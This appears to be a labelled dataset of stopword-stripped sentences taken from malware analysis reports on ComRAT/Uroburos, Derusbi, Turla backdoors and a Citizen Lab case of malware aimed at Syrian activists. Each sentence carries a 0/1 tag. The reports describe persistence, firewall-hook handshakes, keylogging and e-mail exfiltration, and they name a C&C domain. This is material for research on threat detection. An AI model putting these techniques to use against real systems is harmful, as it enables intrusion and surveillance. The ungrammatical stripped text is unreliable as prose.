You act upon information contained email without obtaining specific professional advice	0
No representation warranty ( express implied ) given accuracy completeness information contained email extent permitted law PricewaterhouseCoopers LLP members employees agents accept assume liability responsibility duty care consequences anyone else acting refraining act reliance information contained email decision based	0
In February 2014 experts G DATA SecurityLabs published analysis Uroburos rootkit Russian roots	0
We explained link exists Uroburos Agent.BTZ malware responsible '' significant breach U.S. military computers ever	0
'' Nine months later buzz around Uroburos aka Snake Turla identified new generation Agent.BTZ	0
We dubbed ComRAT analyzed two versions threat ( v3.25 v3.26 )	0
As reported earlier year Agent.BTZ used encoding key installation log file name Uroburos	0
ComRAT version 3.25 shows behavior	0
Furthermore attackers also shared C & C domain	1
The latest version ComRAT known us ( v3.26 ) uses new key create installation log file order complicate analysis disguise link two cases	1
Another interesting fact attackers use COM Object hijacking persistence mechanism COMpfun described recently	1
Taken everything consideration indications saw analyzes lead supposition group behind Agent.BTZ Uroburos still active pursuing Agent.BTZ path improve change RAT	0
The analyzed file latest version identified v3.26	0
The version identification described chapter '' Log files ''	0
The major difference version older version ( ) described	0
The first task malware install file credprov.tlb % APPDATA % \Microsoft\	1
This file main payload malware	0
The dropper executes following command order install second file The second file shdocw.tlp	1
The two files Microsoft Windows dynamic libraries	0
To started boot process infected machine malware creates following registry key This registry key used associate library shdocvw.tlp object 42aedc87-2188-41fd-b9a3-0c966feabec1 previously explained article COMpfun	1
The purpose load library every process executed infected system	1
If version malware older 3.26 dropper creates additional file called winview.ocx	1
We noticed file name still file name used Agent.BTZ past	0
The file xored following obfuscation key ( used Uroburos Agent.BTZ ) Here decoded log file content We notice malware checks older version installed system case dropper removes older version	1
In contrast Uroburos analysis found Uroburos install case version Agent.BTZ found system	1
During startup infected machine shdocvw.tlp library loaded processes	1
If process explorer.exe library load library called credprov.tlb	1
This library real payload	0
Its features common Remote Administration Tool ( RAT ) ComRAT 's communication command control server performed browser process explorer.exe order avoid blocked firewall system additional security products	1
The communication processes performed named pipe	1
Two log files created malware execution mskfp32.ocx msvcrtd.tlb	1
If malware version older 3.26 xored key dropper key	0
Concerning version 3.26 malware uses new non-ASCII key	0
Here example decoded log file version 3.26 We identify version malware thanks PVer flag	0
The command control server information stored registry XML encoded For example analyzed sample CC weather-online.hopto.org	1
This domain far unknown mentioned BAE System 's Uroburos ( aka Snake ) analysis paper C & C server domain Uroburos malware	0
Another connection cases	0
If malware version lower 3.26 XML log file contains command control server information Let us summarize similarities differences Agent.BTZ Uroburos ComRAT far Some parts code exactly ( appears copy & paste )	1
That reason sample detected Uroburos ( aka Turla )	0
The code used Agent.BTZ also dll loaded userland Uroburos analysis	0
Command control server domains shared Uroburos ComRAT	1
In version 3.26 author changed key remove known file name	0
This action indication developer 's effort hide connection	0
The main difference design	0
Agent.BTZ common RAT simple library executed infected machine	1
ComRAT complex cleverer	0
The malware loaded every process infected machine main part ( payload ) malware executed explorer.exe	1
Furthermore C & C communication blends usual browser traffic malware communicates browser named pipe	1
It far complex userland design Agent.BTZ	0
These differences mainly complex design lead us give malware new name	0
The analyzed dropper v3.25 compilation date February 6th 2014	0
The recent dropper v3.26 mentioned changes implemented reveals compilation date January 3rd 2013	0
We suspect date spoofed order disguise fact newer version	1
This analysis shows even Uroburos publication February 2014 group behind piece malware seems still active	0
In case ComRAT developers implemented new mechanisms changed keys removed log files hide activities tried disguise connections RAT ComRAT rootkit Uroburos RAT Agent.BTZ much possible	0
However still follow evolution malware comparing versions	0
The persistence mechanism discovered October 2014 makes possible intrude system really discreet manner estimate actors use persistence mechanism near future	0
We definitely keep ears eyes open continue analyzing	0
There two types Derusbi malware client - server model server - client model	0
Both types provide basic RAT functionality distinction two largely directionality communication	0
This report focus server - client variant ( simply " server variant " ) Derusbi acts server victim 's machine waits commands controlling client	1
In Derusbi server variant largely unremarkable RAT viewed perspective functional capabilities	0
The server variant supports basic RAT functionality file management ( uploading downloading ) network tunneling remote command shell	0
What makes server variant interesting device driver variant installs	1
The server variant utilizes device driver order hook Windows firewall either using largely undocumented Windows Firewall hooking techniques found Windows XP older using documented Windows Filtering Platform found Windows Vista later	1
The driver hooking firewall using either two mentioned interfaces inspect incoming network packets	1
If specific handshake occurs client server variant remainder communication session established session redirected server variant	0
If driver detect appropriate handshake network traffic allowed pass unobstructed	0
This allows attacker hide communication within cluster network sessions originating single IP would case client performing multiple HTTP requests web server	1
The server variant runs svchost dependent service	0
While server variant binary exports related standard service DLL ( e.g.	0
ServiceMain DllRegisterService etc ) startup sequence truly begins DllEntryPoint function	0
When loaded memory via LoadLibrary equivalent function call server variant determine name host binary ( presumably svchost.exe ) well DLL 's name	1
The binary spawns new thread contains main server variant code order allow DllEntryPoint routine return calling function	1
Within main server variant function ( dubbed mainThread ) server variant loads pointer API function GetCommandLineW locates pointer memory command line string locates first space within command line string terminates string placing NULL character location	0
The server variant attempts determine suitable access rights within system order operation	1
The check access rights effectively checks see server variant process running NT Authority	1
If check unsuccessful server variant terminates	0
With command line patched authority verified server variant sleeps 5 seconds verifying fShutdown flag set	0
The fShutdown flag become set process loading server variant calling DllRegisterServer export	0
The DllRegisterServer function among tasks attempt install server variant server victim 's machine	1
Therefore waiting 5 seconds continuing mainThread functionality server variant giving DllRegisterServer time activate perform necessary operations ensure server variant properly installed activated service	0
The mainThread calls mainLoop function server variant	0
The mainLoop function begins loading unique infection ID victim 's machine registry ( key value located HKLM\SOFTWARE\Microsoft\Rpc\Security )	1
The infection ID present must decoded XOR'ing byte string static byte value ( typically 0x5F )	0
If infection ID exist within registry server variant attempt load configuration encoded buffer located immediately static string XXXXXXXXXXXXXXX decode buffer starting last byte XORing previous byte current byte value reverse order ; server variant use specific portion configuration blob infection ID 's base	0
Next server variant append hyphen four digit value end infection ID generate unique infection ID victim 's machine	0
The newly generated infection ID saved registry location stated previously	0
The mainLoop attempts get privileges SeDebugPrivilege SeLoadDriverPrivilege SeShutdownPrivilege SeTcbPrivilege order perform necessary operations load driver portion server variant	1
The mainLoop attempt open handle driver ( already installed ) calling CreateFile filename \Device\{93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F}.	0
Failing mainLoop determines victim 's machine running 360 antivirus product looking process name ZhuDongFangYu.exe	0
If process running driver installed mainLoop continues regardless	0
If process found however mainLoop extract driver binary encoded buffer within decode file memory ( using rotating 4-byte XOR key ) install driver victim 's machine % SYSDIR%\Drivers\{93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F}.sys	0
With driver present ( recently installed ) mainLoop spawns another thread ( dubbed DerusbiThread::DerusbiThread ) acts primary communication loop	0
DerusbiThread::DerusbiThread begins generating PCC_SOCK object	0
PCC_SOCK abstraction communication subsystem	0
The prototype PCC_SOCK appears Figure 1	0
With new PCC_SOCK object allocates DerusbiThread::DerusbiThread selects port 40,000 45,000 use listening port	1
The port number sent driver ( via IOCTL 0x220200 ) order inform driver redirect incoming traffic	0
The " Windows Device Driver ( Firewall Hook ) " section explains functionality driver greater detail	0
DerusbiThread::DerusbiThread binds specified port opens port listener	1
At point DerusbiThread::DerusbiThread enters infinite loop waiting new connections listening socket dispatching new thread ( dubbed CommLoop ) handle traffic socket fShutdown set	0
At point startup sequence Derusbi complete server variant moves communication command dispatch phase	0
The communication controlling client Derusbi server variant depends device driver place	0
The authors device driver designed driver work Windows 2000 later versions Windows operating system	0
Depending version victim 's OS driver hook Windows Firewall either using surprisingly undocumented IOCTL_IP_SET_FIREWALL_HOOK command \\Device\IP device Windows XP older machines using documented Windows Filtering Platform ( WFP ) found Windows Vista later	0
The device driver inspects incoming network traffic client connecting victim machine determines appropriate handshake packet occurs beginning new TCP session makes decision reroute network traffic Derusbi malware let traffic continue unaltered original service	1
Once session established means valid handshake subsequent packets client given TCP session automatically directed device driver Derusbi server variant	0
The device driver capture store network traffic outside initial handshake inspection	0
The Derusbi server variant select available random port range 40,000 45,000 victim 's machine upon listen	1
After selecting port server variant wait incoming connections instruct driver redirect appropriate TCP sessions listening port	1
In order establish valid communication channel server variant controlling client specific handshake required	0
The handshake client server variant well defined consisting 64 bytes data within handshake entirely random exception 3rd 8th DWORD	0
The handshake begins client sends 64 byte random buffer 3rd ( offset 12 ) 8th ( offset 32 ) DWORDs defined	0
The server acknowledge handshake sending 64 byte random buffer pattern 3rd 8th DWORDs based new randomly generated 1st DWORD ( offset 0 )	0
It client 's handshake driver server variant triggers	0
Some older versions server variant use different set DWORDs validate handshake also tests	0
These versions observed use following DWORDs	0
If handshake fails server variant provides secondary means authenticate client	0
Presumably failsafe driver unable load secondary method requires client send POST request following form	0
In addition POST request must contain Via field	0
If request Via field exist server variant authenticates client responds If client 's request meet appropriate authentication criteria server variant sends	0
With communication channel server variant client established server sends information victim 's computer	0
Consisting 180 byte data structure ( Figure 3 ) server variant provides client variety details victim 's machine	0
The VictimInfoPacket identifier 2 ( see dwPktType explanation )	0
The communication server client point remainder session encrypted	0
Communication client server variant exists form sequence encrypted datagrams	0
Each datagram consists 24 byte header followed optional payload section	0
The header encrypted optional payload attached payload encrypted using DWORD XOR	0
The format header follows	0
The dwTotalPacketSize field defines total size datagram including size header size optional payload	0
The dwPktType field correlates module ID allows server variant route datagram appropriate module without inspection payload data	0
The dwChecksum value sum bytes within optional header ( field ignored present payload section )	0
The dwEncryptionKey 32-bit XOR encryption key payload section	0
If fCompressedPayload field non - zero data within payload compressed using LZO compression ( prior XOR encoding ) dwDecompressedSize field represents final size payload data decompression	0
The payload section three different presentations depending compression used	0
The first presentation original payload data generated client server second presentation LZO compressed form final presentation ( presentation exists going across network ) 32-bit XOR encoded data blob	0
Figure 4 provides graphical representation presentation types payload section	0
After sending server information via VictimInfoPacket server variant spins CommLoop thread connection returns waiting new connections clients appear	1
The CommLoop thread begins establishing set internal command handlers available server variant	0
With exception administrative command handler ( built CommLoop ) internal commands consists object derived base object PCC_BASEMOD	0
The server variant appears modular design allowing attacker compile components necessary given operation	0
The malware supports 8 different modules per sample module designating ID code	0
Novetta observed following modules	0
Given spacing ID numbers ( noted gap 0x82 0x84 otherwise sequential ID scheme ) conceivable additional modules exist	0
After establishing tools infinite loop ( CommLoop ) entered server variant wait 1/100 second input network ; input arrives server routes packet appropriate handler	0
If network input arrive CommLoop queries command handlers packets may queued ( calling command handler 's ReadWaitingData function ) transmits packets handlers generated	0
Additionally 60 seconds passes network inputs client network outputs server variant CommLoop send beacon packet ( dwPktType = 4 )	0
CommLoop routes packets appropriate command handler object locating dwPacketIdentifierCode within registered command handlers matches incoming packets dwPktType	1
When appropriate command handler found CommLoop passes payload portion packet command handler 's ProcessPacket function	0
The PCC_CMD object contains remote shell functionality server variant along ability execute arbitrary programs	0
Derived PCC_BASEMOD class PCC_CMD class 's operations focused largely ProcessPacket ReadWaitingData functions	0
The PCC_CMD::ProcessPacket function works stub function merely passes packet 's payload data ( pkt ) data PCC_CMD::ProcessPacketEx ignoring dwPktSize parameter	0
The packet 's payload data another datagram header optional payload section	0
The payload PCC_CMD destined packet contains following header	0
The dwCommandType field specifies specific PCC_CMD command client requesting server variant perform	0
There four commands PCC_CMD supports	0
For commands output acknowledgement commands comes form another packet consisting PacketHeader followed PCCCMDPacketHeader optional payload data	0
The dwCommandType newly constructed packet matches command 's original dwCommandType value ( e.g.	0
responses 0x04 commands reply dwCommandType set 0x04 )	0
PCC_CMD::ProcessPacketEx queue response packets internal buffer	0
The PCC_CMD::ReadWaitingData member function responsible transmitting previously queued packets PCC_CMD::ProcessPacketEx	0
If queued packets PCC_CMD::ReadWaitingData perform queue console output pipe remote shell process ( active ) ; function also attempt read entirety waiting data becomes payload PacketHeader / PCCCMDPacketHeader based packet dwCommandType set 0x0C.	0
If read unsuccessful function returns PacketHeader / PCCCMDPacketHeader based packet dwCommandType set 0x10 indicating error terminating remote shell session	0
The PCC_FILE object provides large range file system administration functions	0
PCC_FILE derived PCC_BASEMOD class meaning processing commands contained within PCC_FILE::ProcessPacket member function additional processing done PCC_FILE::ReadWaitingData member function	0
This necessarily case however	0
The PCC_FILE::ProcessPacket member function much like PCC_CMD::ProcessPacket little stub function passes copy payload data ( pkt ) PCC_FILE::ProcessPacketEx	0
PCC_FILE::ProcessPacketEx performs file management operations instead adds incoming command packets queue processing PCC_FILE::ReadWaitingData packet already within queue ( thus avoiding duplication commands )	0
The PCC_FILE::ReadWaitingData member function stub function calls PCC_FILE::ProcessQueue returns resulting packet queue processing	0
This means file operations surprisingly low priority potentially high latency operations	0
Each packet arrives within packet queue PCC_FILE contains standard header followed ( quasi - optional ) payload data blob	0
The header PCC_FILE command packets takes following form	0
The dwCommandType field specifies specific PCC_FILE command client requesting server variant perform	0
PCC_FILE supports 17 ( 15 unique ) commands	0
While general form within Derusbi server variant communication model return packet dwCommandType original command many PCC_FILE commands return status packet type ( dwCommandType = 0x04 )	0
Commands 0x2C 0x44 0x48 appear exact base command slight variations response format	0
It unclear particular command included three times PCC_FILE	0
The PCC_PROXY object provides platform tunneling network traffic client specific endpoint ( endpoints multiple tunnels activated client )	0
Derived PCC_BASEMOD class PCC_PROXY class performs little network tunneling within CommLoop interactive PCC_PROXY::ProcessPacket PCC_PROXY::ReadWaitingData member functions	0
The PCC_PROXY::ProcessPacket member function queues incoming PCC_PROXY packets received queue PCC_PROXY::ReadWaitingData returns packets transmit queue directionality perspective server variant	0
The core PCC_PROXY 's network tunneling comes spawned processing thread ( PCC_PROXY::MainThread ) generated PCC_PROXY object instantiated	0
The PCC_PROXY::MainThread function consist infinite loop terminates PCC_PROXY::fShutdown flag set	0
Otherwise loop inspect another internal flag ( PCC_PROXY::fNetworkEnabled ) determine network tunneling currently active	0
If PCC_PROXY::fNetworkEnabled flag set false tunneling disabled command processing continues	0
It possible one tunnel active given time	0
In order firewall tunnels backbone server variant 's command channel tunnel assigned specific channel identifier	0
This allows client specify specific tunnel data transmitted well telling client tunnel returning data	0
If PCC_PROXY::fNetworkEnabled flag set true PRC_PROXY::MainThread loop active channels perform select socket connected endpoint -- select indicates data waiting particular socket -- data read	0
A new PCC_PROXY based packet generated packet queued delivery client	0
After processing channels new data PCC_PROXY::MainThread processes incoming command packets client ( operation usually handled PCC_BASEMOD::ProcessPacket function )	0
Packets belonging PCC_PROXY subsystem common header much like PCC_BASEMOD derived classes	0
To end PCC_PROXY packets packet header PCCFilePacketHeader packet header	0
The PCC_PROXY supports five commands	0
The administrative commands built - server variant derived PCC_BASEMOD class	0
Each administrative command packets contains header structure PCCFilePacketHeader structure followed optional payload data blob	0
The administrative commands consist following five commands	0
Given encrypted potentially compressed nature Derusbi server variant network traffic detecting traffic network problematic using traditional IDS signatures	0
Using heuristic approach would possible detect handshake possible Derusbi server variant session looking following pattern	0
Detecting Derusbi server variants disk possible using following YARA signature	0
File name varies MD5 a3cbf6179d437909eb532b7319b3dafe Compilation timestamp 2012.10.02 10:51:50 ( GMT ) Compiler Microsoft Visual Studio 2010 File format PE32 DLL Exports _ LowLevelKeyboardProc@12 Creates log file % TEMP%\~DFD3O8.tmp	1
If failed tries write file f:\keyhook.log Each time keylogger starts appends following header log file	0
-------------------------------------------------------------------------------- New Session % fully qualified computer name% % timestamp% -------------------------------------------------------------------------------- It creates hidden console window registers export _ LowLevelKeyboardProc@12 hook procedure low - level keyboard input events ( WH_KEYBOARD_LL hook )	1
Depending results writes line log file	0
In case hook installed line " Started ... " else " LoadLibrary ' % path file% ' failed % error code% "	0
It also starts thread retrieves current foreground window handle every 100 milliseconds	0
This handle used keyboard hook procedure	0
The low - level keyboard hook procedure intercepts WM_KEYDOWN WM_KEYUP WM _ SYSKEYDOWN system messages writes information keystroke log file	1
Every time new window becomes active retrieves name path application writes information log file	0
[ % path application 's executable file% " % window title% " ] Analyzed file ( others similar )	0
Compilation timestamp 2013.10.15 10:43:09 ( GMT ) File format PE32 DLL modified ( file supposed started custom loader ) Exports	0
The main functionality implemented single function called DllMain entry point	0
The exported functions allow call function directly ( exported " start " ) start / stop separate thread ( " ModuleStart"/"ModuleStop " ) slightly different parameters	0
This indicates backdoor also function plugin Turla Carbon system	0
The main function executes infinite loop	0
It collects available information system transmits C&C server executes commands receives back	1
The module delays execution random periods discovers running processes one following filenames	0
The following system information collected	0
The retrieved information compressed using bzip2 encrypted AES encoded using Base64 transmitted C&C server	1
When file waiting upload ( usually file contains results previously received executed command ) read disk uploaded server instead system information	1
The C&C communication implemented top standard HTTP / HTTPS protocols	0
The list C&C URLs hardcoded binary may overridden commands	0
The module uses Wininet API functions issuing HTTP POST requests server	1
The module transmits collected information body POST request gets new commands server 's response	1
The request body empty new information upload	0
The response usually HTML document commands Base64-encoded strings enclosed div>/</div tags	0
Every command encrypted using asymmetric encryption temporary AES session keys	0
Each command mixed text / binary buffer	0
It consists two parts payload configuration	0
The configuration INI file controls behavior module	1
It extracted temporary file named % TEMP%\~D%random%.tmp	0
The payload exists supposed executable file may executed corresponding command present INI part	0
The format decoded command following	0
Format C&C command buffer Available commands	0
Lateral movement tools	0
Epic / Tavdig backdoors	0
Dropper packages installs Epic Turla Carbon system	0
PDF exploits used spearphishing attacks drops Epic backdoor	0
SCR / EXE files - used spearphishing / social engineering	0
Fake " Adobe Flash Player " Epic backdoor installers	0
Fake " Microsoft Security Essentials Quick Scan " Epic backdoor installer Turla Carbon Pfinet backdoors Turla Carbon package Related Turla sample module Java Exploits used waterhole attacks	0
John Scott-Railton Seth Hardy With collaboration Cyber Arabs	0
Media coverage Associated Press Forbes This report describes malware attack circumstantial links Islamic State Iraq Syria	0
In interest highlighting developing threat post analyzes attack provides list Indicators Compromise	0
A Syrian citizen media group critical Islamic State Iraq Syria ( ISIS ) recently targeted customized digital attack designed unmask location	0
The Syrian group Raqqah Slaughtered Silently ( RSS ) focuses advocacy documenting human rights abuses ISIS elements occupying city Ar- Raqah	0
In response ISIS forces city reportedly targeted group house raids kidnappings alleged assassination	0
The group also faces online threats ISIS supporters including taunts ISIS spying group	0
Though unable conclusively attribute attack ISIS supporters link ISIS plausible	0
The malware used attack differs substantially campaigns linked Syrian regime attack focused group active target ISIS forces	0
As Syrian Civil War continues Syrian citizen journalists nonviolent activists operate increasingly unsafe environment	0
The regime never welcomed work often targeted arrest detention multi-year hacking campaign ( see Pro-Regime / Regime Linked Groups )	0
Additionally elements Syrian opposition uniformly supported nonviolent activists citizen journalists	0
More recently areas like Raqqah nonviolent activists face new exceptionally grave threat ISIS	0
A growing number reports suggest ISIS systematically targeting groups document atrocities communicate Western media aid organizations sometimes pretext finding '' spies ''	0
Ar-Raqqah city case study located situated northern Syria continues key conflict flashpoint Syrian Civil War	0
In spring 2013 Islamists Free Syrian Army ( FSA ) fighters took Ar- Raqqah regime forces	0
As ISIS gained momentum consolidated control city edging FSA- affiliated groups attacks summary executions kidnappings range groups including ethnic religious minorities	0
During 2014 number reports-many unconfirmed-that ISIS confiscated smartphones laptops captured activists	0
According Syrians experienced searches spoke one reports ' authors ISIS sometimes extracts data confiscated smartphones laptops collect information people groups targeting well seek evidence '' un-Islamic '' activities	0
As ISIS cements control Ar-Raqqah territories reports emerged recently ( though confirmed ) suggesting elements within ISIS growing increasingly sophisticated imposing control targeting opponents using digital methods	0
Reports ISIS targeting Internet cafés grown increasingly common cases reports point possible use keyloggers well unspecified '' IP sniffers '' track behaviour Internet cafes	0
Nonviolent activists citizen journalists based Ar-Raqqah provided outside world much know ISIS treats population	0
These activists journalists face mortal danger actions reports emerged detention torture hands ISIS	0
As ISIS continues use social media push message welcomed population Ar-Raqqah groups like Raqqah Slaughtered Silently ( RSS ) provide compelling counter narrative	0
RSS n't escaped ISIS ' notice group targeted kidnappings house raids least one alleged targeted killing	0
At time writing ISIS allegedly holding several citizen journalists Ar-Raqqah	0
In addition RSS targeted online ISIS supporters harassment including threats physical safety members	0
For example ISIS supporters claimed ISIS established system CCTV cameras Ar-Raqqah observe residents ' movements	0
While claim may bluff exaggeration least one ISIS supporter indicated social media system could used look members RSS	0
This section describes highly targeted attack sent e-mail address belonging RSS	1
The Citizen Lab analyzed attack consent RSS requested name used report	0
The attack took form unsolicited e-mail containing download link decoy file	1
The file contained custom malware profiled victim 's computer beaconed IP address e-mail account attacker 's control	1
The unsolicited message sent RSS end November 2014 Gmail email address	1
The message carefully worded contained references specific work interests RSS	0
Thank efforts deliver true picture reality life Raqqah	0
As Syrians residing Canada working media believe importance shedding light realities life Syria Raqqah particular	0
We preparing lengthy news report realities life Raqqah	0
We sharing information hope correct case contains errors	0
We prepared map city Raqqah addition preliminary report	0
We hope look inform us errors	0
We also hope happen Facebook could provide us account person responsible campaign n't mind communicate directly	0
You see preliminary copy report linkhttp //tempsend [ DOT ] com/ [ Redacted ] With respect [ Name Redacted ] We unsure attacker specifically mentions Canada email lure	0
However well known Syria's extensive diaspora ( including Canada ) regularly engages advocacy sometimes coordination groups within Syria	0
Thus message face implausible	0
However note attacker also attempts social engineer identity individuals working RSS requesting personal Facebook page	1
The custom malware used attack infects user views decoy '' slideshow '' beacons home IP address victim 's computer details system time computer restarts	1
Unlike Syrian regime-linked malware contains Remote Access Trojan ( RAT ) functionality suggesting intended identifying locating target	1
Further malware sends data captured malware e-mail address require attackers maintain command-and-control server online	1
This functionality would especially useful adversary unsure whether maintain uninterrupted Internet connectivity	0
Accessing link provided malicious e-mail sends user .zip	0
file hosted file-sharing site tempsend.com	0
At time writing file downloaded 10 times This file self-extracting archive icon intended suggest victim slideshow	0
When run file opens slideshow Google Earth screen captures victim displaying series locations Syria highlighting '' ISIS HQ '' images showing alleged locations US airstrikes	0
Examples images slideshow follows When opened '' slideshow.zip '' file writes executes several files '' AdobeR1.exe '' malicious '' pictures.exe '' genuine slideshow displayed victim	1
When slideshow closed AdobeR1.exe pictures.exe deleted	1
The AdobeR1 file writes series executable files perform information collection communication functions including The program sequence data collection sending somewhat unusual program performing single task communicating via markers left registry	1
Programs appear make use Visual C++ Runtime Library	0
First program nvidrv adds autorun It also creates series registry keys individual programs use communicate Registry keys programs using It runs GooglUpd cleans program files exist runs AdbrRader	1
AdbrRader ( communicating registry key '' 2 '' ) writes file vgadmysadm.tmp name another registry key '' 2 '' startup info	1
Next nvidrv runs GoogleUpate collects system information writes Then nvidrv runs nvisdvr ( registry key '' 4 '' ) collects list running processes written Finally nvidrv runs svhosts tests Internet connectivity DNS query windowsupdate.microsoft.com	1
It runs rundl132 checking whether registry key name '' 6 '' present	1
It sets key '' 0 '' runs	1
Next '' rundl132.exe '' performs HTTP GET request myexternalip.com collects external IP infected machine Next rundl132 writes Then rundl132 writes external IP Finally rundl132 runs AdobeIns zips contents win32.tmp folder	1
Program '' AdobeIns.exe '' takes files written programs zips encrypted password- protected file Data transmitted e-mail account presumably controlled attacker	1
AdobeIns connects account online e-mail provider inbox.com via smtp using hardcoded credentials	1
The malware sends e-mail inbox containing text '' Hello '' mxtd file attached	1
SMTP traffic generated malware inbox.com ( redactions ) The malware seen case study unusual relies half-dozen separate executable files single task communicating via markers dropped Registry	1
The malware also interesting provide remote access sends e-mail containing victim 's IP address miscellaneous system information	1
The malware resends information time computer restarted refresh sent information restart ( may bug )	1
This behaviour strongly suggests function malware serve beacon	1
The system information could used identify processes exploit future however since attacker already triggered execution file victim 's system surprising taken RAT ( custom widely available ) used	1
A RAT would provided much greater access alongside IP information By providing remote access RAT functionality program looks less like malware may attract less attention endpoint protection tools scanners	1
Detections low file first submitted VirusTotal example	0
It registered 6/55 detections anti virus scanners 10 % detection rate	1
Transmitting malware via e-mail also provides degree obscurity additional advantage providing layer abstraction attacker target need maintain RAT command-and-control server	1
The malware transmits autonomously leaving material inbox attacker collect later time	1
The malware obfuscation processes highly technical development interaction Windows	0
Nevertheless believe author program aware certain techniques reduce visibility malware network including transmitting data via encrypted e-mail communications	1
However attacker correctly implemented encrypted e-mail malware attempt use TLS connection certain cases	0
As result account login credentials may readily available network traffic	0
In addition malware uses old PKWARE implementation zip encryption particularly secure	1
The password zipped file also present binary without encryption obfuscation	0
Citizen Lab researchers developed Targeted Threat Index ( TTI ) tool standardize information sophistication targeted threats civil society groups research	0
The index captures information level social engineering used ( '' Targeting Sophistication '' ) adds Technical Sophistication value attack multiplier	0
This attack little technical sophistication ( i.e. uses exploits code obfuscation techniques frustrate reversing etc	1
) nevertheless carefully developed social engineering seeding materials bait document	1
Taken together rates 3 Targeting Sophistication 1.25 Technical Sophistication metric yielding TTI score 3.75	0
Citizen Lab research using TTI found despite low levels technical sophistication well-crafted social engineering malware attacks remain highly effective civil society groups	0
More information available TTI recent Usenix Security paper	0
There least three possible sources malware attack We evaluate possibilities turn drawing information available us almost three years tracking regime-linked malware	0
Pro-regime malware actors continually targeted Syrian opposition waves malware since least late 2011	0
Those campaigns extensively reported range groups including Kaspersky FireEye Citizen Lab Electronic Frontier Foundation many others	0
Regime-linked malware number common features typically serve distinguishing characteristics Social engineering focusing needs interests opposition	0
Although targeted malware seeding often aims classes people ( e.g. people interested 'shocking ' news fighter 'leaked ' information Assad regime ) rather carefully written spear phishing targeting single individual small group	1
Use widely available RATs ( njRAT Xtreme Rat ShadowTech Rat DarkComet RAT Blackshades RAT among others )	1
At least one command-and-control server located within Syrian IP space ( often limited range addresses )	1
Frequent use Dynamic DNS providers like no-ip	0
Use '' crypters '' obscure binary	1
These characteristics present every sample typically found one almost every binary examined Syrian regime-linked	0
This malware attack differs known regime-linked groups elements	0
Not exceptionally targeted also commonly available RAT	1
Nor RAT functionality	0
The function malware appears identify unmask IP address target ( ) resend attacker reboot	1
In addition data sent Internet e-mail address crypter used obscure binary	1
We aware one previous case Syria e-mail used transmit data believed regime linked	1
That incident observed 2012 also used hardcoded e-mail exfiltrate	1
However malware substantially functionality case drop second stage compromised site also included mechanism exfiltrating credentials Facebook hooking programs like Skype	1
The lack overlap Tactics Techniques Procedures ( TTPs ) attack prior attacks rule Syrian regime-linked attackers	0
It possible regime-linked groups trying new approach	0
However given known regime-linked groups continued remain active date range using familiar TTPs scenario seems unlikely	0
In addition would strange regime-linked malware groups undertake significant effort prepare send implant significantly less functionality commonly use	0
Taken together find evidence supports hypothesis familiar regime-linked groups conduct attack	0
RSS operates territory controlled ISIS faced extensive targeting ISIS	0
Currently appear directly targeted ISIS kidnappings retaliation including executions	0
In addition ISIS supporters explicitly suggested group surveillance actively hunted	0
Together evidence suggests ISIS strong motivation using social engineering and/or malware locate members RSS	0
We think several features malware attack align needs constraints ISIS supporters Ar-Raqqah groups understand	0
For example The malware beacons location provide RAT functionality	1
The seeding attempts obtain 'private ' Facebook identity RSS social engineering	1
The malware exfiltrates online e-mail account thus requiring attacker maintain command-and- control server online	1
The social media activity members RSS often highly public	0
Their location exact membership however secret	0
We speculate attacker interested maintaining long-term surveillance activities RSS could employed RAT	0
However attacker interested unmasking location targets could physically tracked collecting IP data system info would reasonable approach	0
ISIS supporters clearly strong interest ( rudimentary ) location tracking members RSS malware provides	0
Internet connectivity Raqqah extremely limited ISIS control	0
Knowing IP address target could quickly narrow targets specific locations specific Internet services Internet cafes Raqqah	0
Given identities locations RSS members closely guarded information would hold significant intelligence value ISIS	0
Armed kind information ISIS could physically harm people within Raqqah ( also possible ability operate capacity border areas Turkey )	0
Little publicly known technical capabilities ISIS supporters ; however reports begun emerge suggesting ISIS interested expanding abilities	0
In addition ISIS reportedly gained support least one individual experience social engineering hacking Junaid Hussain ( aka TriCk ) former member teamp0ison hacking team	0
While Mr. Hussain associates reportedly made threats Western governments possible others working ISIS quietly supported effort identify targeted organization highly visible thorn side ISIS	0
It possible attack product actors working unknown purposes targeting RSS	0
Given activities RSS however unclear might	0
It possible example reject theory unknown group within FSA groups opposing Assad regime responsible	0
Citizen journalists Ar-Raqqah previously critical arbitrary arrests carried non-ISIS groups 2013	0
However unclear groups longer control Ar-Raqqah would interested RSS November 2014	0
It likely third party actors including several intelligence services closely monitoring various actors conflict range electronic means	0
However little reason suggest would use tailored technically rudimentary attack target RSS particular	0
After considering possibility find strong inconclusive circumstantial evidence support link ISIS	0
However unable connect attack directly ISIS Mr. Hussain ISIS supporters	0
If indeed ISIS supporters responsible seems reasonable offensive capability may still development	0
We hope publishing report draw attention new concerning threat includes ISIS critics among targets	0
If ISIS responsible attack targets in-country impediments ISIS objectives targets may include ideological military adversaries abroad	0
Whether ISIS responsible attack likely work non-regime threat actor may beginning field still-rudimentary capability Syrian conflict	0
The entry costs engaging malware attacks conflict like Syrian Civil War low made lower fact rule law nonexistent large parts country	0
In still parts ( regime control ) malware attacks appear state sanctioned	0
Citizen Lab research targeted digital threats civil society confirms civil society groups face grave threats targeted malware attacks despite under-resourced defend	0
The case highlighted exception lack IT security resources made difficult Syrian opposition address targeted persistent digital threats	0
In addition ISIS indeed responsible case suggests easy belligerents conflict begin fielding basic offensive digital capabilities quickly capabilities pointed unarmed civil society groups	0
This attack exceptionally targeted clearly reflected work actor familiar operations targeted organization	1
As organizations working issues surrounding Syria aware malware delivered good social engineering constant source danger	0
This particular attack prevented opening files sent unknown persons	0
However many attacks Syria come hijacked accounts impersonate people known targets	0
Social engineering remains unsolved problem continues compromise groups throughout Syrian opposition supporters	0
This attack reaffirms dangers posed social engineering attacks whether deliver phishing campaigns malware	0
The circumstantial evidence ISIS involvement suggests groups working topics ISIS considers threat partner organizations supporters urgently examine security policies assess possible risks operations consequences exposure sensitive information ISIS	0
Even link ISIS turns incorrect possible threat future	0
Individuals groups risk also consult materials Arabic provided Cyber Arabs including series accessible videos digital security	0
The malware files Files dropped malware Collected Information Files ( unencrypted ) Exfiltrated file ( encrypted ) Registry Keys Acknowledgements We grateful Cyber Arabs Institute War Peace Reporting critical work assistance	0
Special thanks several anonymous Syrians Masashi Crete-Nishihata Sarah McKune Morgan Marquis-Boire Ron Deibert Bill Marczak Nart Villeneuve Irene Poetranto Kristen Dennesen	0
Support research provided grants John D. Catherine T. MacArthur Foundation Ford Foundation	0
